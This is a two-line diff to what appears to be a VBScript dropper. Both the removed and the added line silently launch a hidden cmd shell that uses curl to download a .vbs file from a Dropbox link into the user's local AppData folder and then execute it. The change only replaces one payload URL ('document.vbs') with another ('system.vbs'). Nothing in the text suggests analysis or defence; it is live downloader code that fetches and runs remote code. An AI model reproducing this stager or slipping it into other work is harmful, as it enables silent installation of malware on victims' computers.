@@ -1,2 +1,2 @@
 
-CreateObject("WScript.Shell").Run "cmd /c curl -L -o ""%LOCALAPPDATA%\d.vbs"" ""https://www.dropbox.com/scl/fi/yj3xz2p9r3o2wga401d3p/document.vbs?rlkey=0nbieesby82obg1jp0eznj7aw&st=ggicpro2&dl=1"" && ""%LOCALAPPDATA%\d.vbs""", 0, False
+CreateObject("WScript.Shell").Run "cmd /c curl -L -o ""%LOCALAPPDATA%\d.vbs"" ""https://www.dropbox.com/scl/fi/v6h1vt1k1ogd9l7a7tenn/system.vbs?rlkey=6a0jxmayo7w09ota2jcwbr5wx&st=phuqyv89&dl=1"" && ""%LOCALAPPDATA%\d.vbs""", 0, False
